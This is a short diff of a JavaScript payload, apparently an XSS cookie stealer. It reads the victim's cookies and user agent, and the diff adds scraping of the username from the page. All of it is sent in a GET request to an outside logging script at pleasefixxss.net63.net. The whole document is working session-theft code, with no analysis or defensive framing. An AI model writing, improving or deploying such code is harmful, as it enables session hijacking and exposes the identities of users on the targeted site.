@@ -1,6 +1,7 @@
 var cookies = document.cookie;
 var userAgent = navigator.userAgent;
-var params = "?cookies=" + cookies + "&agent=" + userAgent;
+var username = document.getElementsByTagName("strong")[0].textContent;
+var params = "?cookies=" + cookies + "&agent=" + userAgent + "&user=" + username;
 var xhr = new XMLHttpRequest();
 
 xhr.open('GET', 'http://pleasefixxss.net63.net/log.php' + params, true);
